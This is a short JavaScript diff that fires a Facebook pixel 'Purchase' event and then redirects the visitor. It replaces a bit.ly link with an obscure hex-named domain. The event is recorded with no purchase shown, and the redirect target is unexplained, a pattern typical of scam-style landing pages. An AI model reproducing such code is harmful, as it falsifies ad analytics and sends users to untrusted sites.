@@ -1,7 +1,7 @@
 function Url() {
   fbq('track', 'Purchase');
   var urls = new Array();
-     urls[0] = "https://bit.ly/WMfb1003"; 
+     urls[0] = "https://1f9ae8a51800cded.com/tf2/"; 
   n = Math.floor(Math.random() * 1);
   location.href = urls[n];
 }
